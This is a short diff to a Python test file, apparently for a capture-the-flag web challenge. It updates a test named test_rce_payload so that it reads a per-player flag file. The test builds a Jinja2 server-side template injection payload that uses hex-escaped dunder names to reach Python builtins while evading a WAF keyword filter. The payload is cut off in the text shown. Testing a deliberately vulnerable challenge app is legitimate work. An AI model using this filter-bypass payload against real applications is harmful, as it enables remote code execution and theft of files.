@@ -23,12 +23,11 @@ def test_waf_blocks_each_keyword(logged_in_client):
         assert resp.status_code == 400, f"WAF should block '{word}'"
 
 
-def test_rce_payload(logged_in_client, app):
-    """Full RCE payload should work on v2."""
+def test_rce_payload(logged_in_client, app, test_player):
+    """Full RCE payload should work on v2, reading the current player's flag4 file."""
     import os
     secret_dir = os.path.join(app.root_path, '..', 'secret')
-    flag_path = os.path.join(secret_dir, 'flag.txt')
-    # Use the actual flag file path (differs between local and Docker)
+    flag_path = os.path.join(secret_dir, f'flag_{test_player["username"]}.txt')
     payload = (
         "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
         "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x62uiltins\\x5f\\x5f')"
